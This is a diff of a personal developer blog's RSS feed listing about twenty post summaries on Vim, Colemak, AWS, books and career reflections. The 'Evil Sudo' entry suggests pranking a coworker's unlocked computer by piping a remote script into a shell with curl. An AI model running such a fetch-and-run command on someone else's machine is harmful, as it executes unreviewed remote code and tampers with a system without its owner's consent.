@@ -5,15 +5,232 @@
     <link>https://blog.tomontheinternet.com/</link>
     <description>Recent content on Tom on the Internet Weblog</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
-    <lastBuildDate>Mon, 20 Dec 2021 21:51:48 -0500</lastBuildDate><atom:link href="https://blog.tomontheinternet.com/index.xml" rel="self" type="application/rss+xml" />
+    <language>en-ca</language>
+    <lastBuildDate>Thu, 03 Jun 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://blog.tomontheinternet.com/index.xml" rel="self" type="application/rss+xml" />
     <item>
-      <title>My First Post</title>
-      <link>https://blog.tomontheinternet.com/posts/my-first-post/</link>
-      <pubDate>Mon, 20 Dec 2021 21:51:48 -0500</pubDate>
+      <title>Improving as a Developer</title>
+      <link>https://blog.tomontheinternet.com/posts/improving-as-a-developer/</link>
+      <pubDate>Thu, 03 Jun 2021 00:00:00 +0000</pubDate>
       
-      <guid>https://blog.tomontheinternet.com/posts/my-first-post/</guid>
-      <description></description>
+      <guid>https://blog.tomontheinternet.com/posts/improving-as-a-developer/</guid>
+      <description>A little while back two things happened to me that made me wonder how I was doing as a software developer.
+ I&amp;rsquo;d taken part in a coding challenge that was meant to be simple, but I&amp;rsquo;d done pretty poorly. I started noticing that the code I was writing was exactly the type of code I encouraged others not to write earlier in my career.  I started wondering&amp;hellip;
+Am I a good software developer?</description>
+    </item>
+    
+    <item>
+      <title>One to Many</title>
+      <link>https://blog.tomontheinternet.com/posts/one-to-many/</link>
+      <pubDate>Tue, 25 May 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/one-to-many/</guid>
+      <description>In this blog post I talk about how my relationship to my sons feels like data modeling. I don&amp;rsquo;t know why I felt like writing about this, but I couldn&amp;rsquo;t stop thinking about it so I wrote it down.
+I don&amp;rsquo;t cover my wife&amp;rsquo;s relationships&#39; with our sons, but rest assured she&amp;rsquo;s very much a part of everything I write about below.
+Relationships I knew having a kid would change my life.</description>
+    </item>
+    
+    <item>
+      <title>Make a New File in the Same Directory in Vim</title>
+      <link>https://blog.tomontheinternet.com/posts/vim-new-file-same-directory/</link>
+      <pubDate>Mon, 07 Dec 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/vim-new-file-same-directory/</guid>
+      <description>TLDR :w %:h/my-new-file.txt # write current buffer to a file in the same directory as the file you are editing :sav %:h/my-new-file.txt # save current buffer to a file in the same directory as the file you are editing Making a new file To make a new file in vim type:
+:w my-new-file.txt: enters command mode
+w writes
+my-new-file.txt is the name of the file
+The new file is written in the root directory where you opened vim.</description>
+    </item>
+    
+    <item>
+      <title>Santa Cypher - A seasonal encoder</title>
+      <link>https://blog.tomontheinternet.com/posts/santa-cypher/</link>
+      <pubDate>Tue, 01 Dec 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/santa-cypher/</guid>
+      <description>Full code: github.com/tom-on-the-internet/santa-cypher.
+Website here: santa-cypher.tomontheinternet.com
+Video here: Youtube
+I&amp;rsquo;m not great at bash But I&amp;rsquo;m trying to get better.
+People say: &amp;ldquo;Build things in Bash to get better at Bash!&amp;rdquo;
+Ok. Here&amp;rsquo;s something&amp;hellip;
+It starts with a stupid idea I wonder if I could write a program in Bash that could encode messages into Santa&amp;rsquo;s laughter. I could send messages around that look like Holiday Cheer, but actually contain a hidden message.</description>
+    </item>
+    
+    <item>
+      <title>I&#39;ve Been a Developer for Three Years</title>
+      <link>https://blog.tomontheinternet.com/posts/developer-for-three-years/</link>
+      <pubDate>Thu, 23 Jul 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/developer-for-three-years/</guid>
+      <description>I&amp;rsquo;ve now been a professional developer for three years. Here are some thoughts. I hoped this would congeal into a solid narrative, but sadly it did not.
+What should a developer know after three years of software development? I compare myself to others. I think it&amp;rsquo;s important to. How else do you know how well you&amp;rsquo;re doing? Of course I&amp;rsquo;m better than I used to be, but am I as good as other developers with my level of experience?</description>
+    </item>
+    
+    <item>
+      <title>I Was on a Podcast</title>
+      <link>https://blog.tomontheinternet.com/posts/i-was-on-a-podcast/</link>
+      <pubDate>Fri, 06 Mar 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/i-was-on-a-podcast/</guid>
+      <description>In December, I wrote a blog post about a podcast I liked. The host of the podcast reached out, and invited me on her podcast. I had a great time.
+The podcast went through my experience of becoming a developer. Allison, the host, did a great job of making it conversational while keeping me on the rails.
+It was my first time being on a podcast. After listening to them for so many years, it was nice to be on the other side of the microphone.</description>
+    </item>
+    
+    <item>
+      <title>A Year of Colemak - What I didn&#39;t expect</title>
+      <link>https://blog.tomontheinternet.com/posts/a-year-of-colemak/</link>
+      <pubDate>Tue, 18 Feb 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/a-year-of-colemak/</guid>
+      <description>I switched to Colemak in late 2018. I wrote about that switch here. I&amp;rsquo;ve now been hacking away in Colemak for over a year and have absolutely no desire to switch back to QWERTY.
+But&amp;hellip;
+Things I didn&amp;rsquo;t expect There are a few things about switching to Colemak that have been pretty annoying, and they weren&amp;rsquo;t things I expected.
+I&amp;rsquo;m a slower typer on Colemak I was never a very fast typer on QWERTY.</description>
+    </item>
+    
+    <item>
+      <title>In Defense of Googleable Questions</title>
+      <link>https://blog.tomontheinternet.com/posts/in-defense-of-googleable-questions/</link>
+      <pubDate>Mon, 09 Dec 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/in-defense-of-googleable-questions/</guid>
+      <description>Interviewing developers is a hard job. Interviewing boils down to one thing: finding out if the person on the other side of the table would make a good addition to your team.
+As an interviewer, the best questions you can ask are those that give you the insight into whether the candidate will be a good addition to your team. Any question you ask is a proxy for finding this out.</description>
+    </item>
+    
+    <item>
+      <title>Taming the Terminal - A Podcast I Liked</title>
+      <link>https://blog.tomontheinternet.com/posts/taming-the-terminal/</link>
+      <pubDate>Sun, 08 Dec 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/taming-the-terminal/</guid>
+      <description>Taming the Terminal is an unusual podcast. It&amp;rsquo;s 37 episodes long, starting in May 2013 and ending (at least for now) 4 years later in May 2017. Each episode has Bart Busschots, one of the hosts, explain a Unix terminal concept to the other host, Allison Sheridan. Each episode also is paired with a blog post that covers the concepts of that episode. It&amp;rsquo;s like no other podcast I&amp;rsquo;ve ever listened to.</description>
+    </item>
+    
+    <item>
+      <title>Moving to AWS</title>
+      <link>https://blog.tomontheinternet.com/posts/moving-to-aws/</link>
+      <pubDate>Sun, 20 Oct 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/moving-to-aws/</guid>
+      <description>I recently moved my website from Digital Ocean to AWS. Here&amp;rsquo;s the what and the why.
+Why Move? I had a perfectly good website set up on Digital Ocean. It was a single server running Linux, NGINX, MySQL and Laravel PHP. It was fast, and flexible. I never had downtime issues. So&amp;hellip; why move?
+AWS knowledge is in demand, and I didn&amp;rsquo;t know AWS very well. There&amp;rsquo;s so much to AWS that you can&amp;rsquo;t learn without putting things into practice, and what better practice than hosting my own site?</description>
+    </item>
+    
+    <item>
+      <title>Evil Sudo</title>
+      <link>https://blog.tomontheinternet.com/posts/evil-sudo/</link>
+      <pubDate>Fri, 18 Oct 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/evil-sudo/</guid>
+      <description>This article assumes basic knowledge of the command-line. It also assumes you are on Linux or Mac.
+There is also a video to accompany this blog post if you prefer. youtube: RrgxRXZf0vI
+Want to infuriate a coworker?  Wait until they leave their computer unlocked. Open a terminal and run this command:  curl files.tomontheinternet.com/evil-sudo.sh | sh Close the terminal.  Now, whenever they try to use sudo, they&amp;rsquo;ll see this:</description>
+    </item>
+    
+    <item>
+      <title>Why I Use Linux</title>
+      <link>https://blog.tomontheinternet.com/posts/why-i-use-linux/</link>
+      <pubDate>Sat, 11 May 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/why-i-use-linux/</guid>
+      <description>I&amp;rsquo;m not sure why I use Linux. This blog post is me figuring out why.
+I want to be a better developer In MacOs, and to a lesser extent Windows, everything &amp;ldquo;just works&amp;rdquo; out of the box. This is not true in Linux, even with popular distros like Ubunutu or Fedora. In Linux, sometimes things just don&amp;rsquo;t work and I am becoming a better developer because of it. On a fresh install of Linux I often can&amp;rsquo;t connect to Wi-Fi.</description>
+    </item>
+    
+    <item>
+      <title>I Like My ThinkPad Now, but the First Two Hours Were Horrifying</title>
+      <link>https://blog.tomontheinternet.com/posts/new-thinkpad/</link>
+      <pubDate>Wed, 17 Apr 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/new-thinkpad/</guid>
+      <description>In 2014 I bought the best computer I&amp;rsquo;d ever owned. Every interaction, every moment was a delight. Installation was smooth, the OS was clean and everything felt just right. I was glad to have left Windows behind. I was happy with my new MacBook Pro. I was an Apple fanboy now, and I wasn&amp;rsquo;t going back to Windows.
+But that was five years ago, and last month when I decided I needed a new laptop, a new MacBook Pro wasn&amp;rsquo;t the obvious choice for a replacement.</description>
+    </item>
+    
+    <item>
+      <title>The Goal (Tom on Books)</title>
+      <link>https://blog.tomontheinternet.com/posts/the-goal/</link>
+      <pubDate>Sun, 14 Apr 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/the-goal/</guid>
+      <description>The Goal is a novel about a manufacturing plant on the verge of being shut down. Written in the 1980s by Eliyahu M. Goldratt, The Goal served as a guide on how to make American manufacturing plants able to compete with the Japanese.
+I didn&amp;rsquo;t read The Goal because I&amp;rsquo;m interested in 1980s manufacturing plants. I read it because it&amp;rsquo;s the book the The Phoenix Project is based on, and in a Reddit thread I was strongly encouraged to read The Goal.</description>
+    </item>
+    
+    <item>
+      <title>The Phoenix Project (Tom on Books)</title>
+      <link>https://blog.tomontheinternet.com/posts/phoenix-project/</link>
+      <pubDate>Sun, 24 Feb 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/phoenix-project/</guid>
+      <description>The Phoenix Project is novel about IT at a large company going horribly wrong and then improving. If that sounds interesting to you, you&amp;rsquo;re probably a very particular kind of geek, like me, who is interested in how technology can be best integrated into an organization. If that sounds boring to you, please never read this book.
+There&amp;rsquo;s a meme going around that all companies are now technology companies, and those companies that realize it too late are doomed.</description>
+    </item>
+    
+    <item>
+      <title>No Meat Until March 4th - A failure story</title>
+      <link>https://blog.tomontheinternet.com/posts/no-meat/</link>
+      <pubDate>Sun, 03 Feb 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/no-meat/</guid>
+      <description>My parents are back in Canada for half a week. Just long enough to remind me that I could be eating better. Losing the weight I gained since moving to Canada has been something I&amp;rsquo;ve said I&amp;rsquo;d do for a while, but I never end up doing it. It&amp;rsquo;s not for lack of knowledge. I know how to lose weight, but I prioritize other things.
+My parents are vegans. My dad lost a lot of weight (&amp;ldquo;30 pounds, just like that!</description>
+    </item>
+    
+    <item>
+      <title>My Game Blew Up on Reddit</title>
+      <link>https://blog.tomontheinternet.com/posts/hack-on-reddit/</link>
+      <pubDate>Mon, 14 Jan 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/hack-on-reddit/</guid>
+      <description>On Saturday (2019-01-12), I posted Hack, a game for web developers, on Reddit. For a few hours, it was the top post on the /r/webdev subreddit. (post here)
+What&amp;rsquo;s the big deal? To me, it was a big deal. A little game I made in my free time was enjoyed by hundreds of other web developers. This was the first time I put anything substantial out there, and it was well received.</description>
+    </item>
+    
+    <item>
+      <title>Hack - Get to Know Your Browser</title>
+      <link>https://blog.tomontheinternet.com/posts/hack-game/</link>
+      <pubDate>Wed, 09 Jan 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/hack-game/</guid>
+      <description>[A new version of Hack is in the works.]
+A couple months ago I started feeling self-concious about my command line Linux skills. There are levels to these things, you see, and I started feeling like I was stuck on level 2 or 3. I could navigate, update files, ssh into servers&amp;hellip; but not too much else.
+A trip to Reddit told me that there was a game called Bandit that can help you improve your command line skills.</description>
+    </item>
+    
+    <item>
+      <title>How My Blog Works</title>
+      <link>https://blog.tomontheinternet.com/posts/how-my-blog-worked/</link>
+      <pubDate>Sun, 06 Jan 2019 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/how-my-blog-worked/</guid>
+      <description>[My blog no longer works like this, but this post is still fun.]
+I plan on blogging more and I&amp;rsquo;ve decided to host my own content. My blog was previously on Medium, but I wasn&amp;rsquo;t happy with that for a few reasons.
+What&amp;rsquo;s wrong with Medium?   When I read something on Medium, I don&amp;rsquo;t care who the author is. All Medium articles look exactly the same, so it feels like they are all written by the same faceless person, and frankly, that faceless person is pretty boring.</description>
+    </item>
+    
+    <item>
+      <title>I Switched to Colemak</title>
+      <link>https://blog.tomontheinternet.com/posts/switch-to-colemak/</link>
+      <pubDate>Sat, 15 Dec 2018 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/switch-to-colemak/</guid>
+      <description>I decided to stop being a QWERTY user. If you don&amp;rsquo;t know what a QWERTY user is, you are one.
+What&amp;rsquo;s Colemak? QWERTY is the most popular keyboard layout for the English language. It gets it&amp;rsquo;s name from the first six characters on the keyboard. Look at any keyboard, perhaps the one on the device you are currently using. That&amp;rsquo;s the QWERTY layout - a layout so ubiquitous that it leads many to believe it is the only keyboard layout.</description>
+    </item>
+    
+    <item>
+      <title>I&#39;ve Been a Developer for One Year</title>
+      <link>https://blog.tomontheinternet.com/posts/developer-for-one-year/</link>
+      <pubDate>Thu, 05 Jul 2018 00:00:00 +0000</pubDate>
+      
+      <guid>https://blog.tomontheinternet.com/posts/developer-for-one-year/</guid>
+      <description>A year ago, at the age of 35, I got my first job as a software developer. It was a long road. I sacrificed a few years of evenings and weekends to get to the point where I was hireable, always longing for the day when I would be paid to write software.
+It came as a surprise to me when the eminently quotable Gordon Zhu, the closest person I had to a mentor, told me that &amp;ldquo;getting a job isn&amp;rsquo;t a great goal.</description>
     </item>
     
   </channel>
